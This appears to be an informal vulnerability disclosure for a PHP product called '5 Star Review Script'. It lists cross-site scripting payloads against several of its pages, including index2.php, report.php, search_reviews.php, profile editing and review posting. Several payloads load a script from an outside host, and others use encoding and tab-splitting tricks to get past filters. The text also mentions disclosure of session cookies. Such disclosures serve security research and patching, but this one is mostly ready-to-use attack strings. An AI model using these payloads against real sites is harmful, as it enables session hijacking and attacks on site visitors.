5 Star Review Script

Homepage:

----------------------------------

index2.php XSS Vuln with cookie disclosure:

By ending quotes and using a few closing and opening tags before and after, we can insertour script code and produce 

this vulnerability.

http://www.example.com/index2.php?pg=2&item_id=11&sort=review.id'>">'><SCRIPT%20SRC=http://www.youfucktard.

com/xss.js></SCRIPT><"<"<"<"&order=DESC&PHPSESSID=91c137efddf8844a26f5c57a8ca2d57d

Aftering clicking the "Email a friend this link" we notice our text partyl is still on the screen aswell, dueto the cookie.

report.php XSS Vuln same as above:

http://www.example.com/report.php?id=970&item_id=251'>">'><SCRIPT%20SRC=http://www.youfucktard.com/xss.js></SCRIPT><"<"<"<"

Again, the cookie data is output on our screen.

--------------------------------------
search_reviews.php XSS Vuln:

One way to achive this XSS example would be to use long UTF-8 Unicode encoding without semicolons. For PoC try 

putting this in the search box:

'>">'<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><"<"<"<"


Now, if we try touse '>">'><SCRIPT%20SRC=http://www.youfucktard.com/xss.js></SCRIPT><"<"<"<" Like the previous results, we get a screen spammed full of "javascript is not allowed" which goes all the way across, and down several 

screens.

Editing your profile XSS Vuln:

For aPoC try using no filtering at all:

<SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT>

http://www.youfucktard.com/xsp/5star6.jpg

------------------------------------------

When posting a review, theres many ways to bypass the filters they use. The way I used in thisscreenshot was to put a 

tab between jav   ascript. For aPoC make sure tabs on and enter:

<IMG SRC="jav	ascript:alert('XSS');">
